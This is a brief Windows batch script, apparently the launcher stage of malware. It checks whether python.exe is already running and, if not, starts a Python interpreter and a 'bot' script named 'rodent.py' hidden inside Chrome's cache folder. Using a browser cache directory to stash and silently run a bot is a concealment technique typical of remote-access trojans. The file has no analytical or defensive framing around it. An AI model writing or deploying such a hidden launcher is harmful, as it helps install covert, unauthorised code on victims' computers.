@echo off
SETLOCAL
SET "INST_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cache\Cache_Data\Cached"
SET "PY_EXE=%INST_DIR%\python.exe"
SET "BOT_SCRIPT=%INST_DIR%\rodent.py"
tasklist /FI "IMAGENAME eq python.exe" 2>NUL | find /I "python.exe" >NUL
IF %ERRORLEVEL%==0 (
    exit /b
)
IF NOT EXIST "%PY_EXE%" (
    exit /b
)
IF NOT EXIST "%BOT_SCRIPT%" (
    exit /b
)
"%PY_EXE%" "%BOT_SCRIPT%"